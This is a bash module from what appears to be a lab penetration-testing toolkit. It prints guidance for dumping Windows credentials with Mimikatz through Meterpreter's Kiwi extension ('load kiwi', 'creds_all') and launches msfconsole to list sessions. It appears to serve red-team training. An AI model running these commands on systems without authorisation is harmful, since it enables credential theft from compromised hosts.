#!/bin/bash
# ==========================================================
# modules/win/attack3_mimikatz.sh
# CONTROLLED / ACTIVE — LAB ONLY (requires existing session)
#
# Objective: Post-exploitation credential dumping guidance (Mimikatz
# via Meterpreter's Kiwi extension). This module is intentionally
# instructional rather than automated — credential dumping should be
# a deliberate, session-by-session human action, not scripted blindly.
# Tools: msfconsole
#
# Prerequisite: an active Meterpreter session (see attack2_shell.sh).
# ==========================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../common.sh"

run_mimikatz_guide() {
    check_deps msfconsole

    local LOGFILE
    LOGFILE=$(log_path "win_mimikatz")

    if command -v figlet >/dev/null 2>&1 && command -v lolcat >/dev/null 2>&1; then
        figlet "Attack 3" | lolcat
    fi

    {
        echo "===== SentryNet Mimikatz Guidance ====="
        date
        echo "Attack Type: Post-Exploitation Credential Dumping (Mimikatz via Kiwi)"
        echo "Prerequisite: Active Meterpreter session required"
        echo ""
        echo "Attach to existing session and run:"
        echo "    sessions -i <id>"
        echo "    load kiwi"
        echo "    creds_all"
    } | tee "$LOGFILE"

    echo ""
    info "Launching msfconsole to list active sessions..."
    msfconsole -q -x "sessions -l"

    ok "Session log: $LOGFILE"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    run_mimikatz_guide
fi
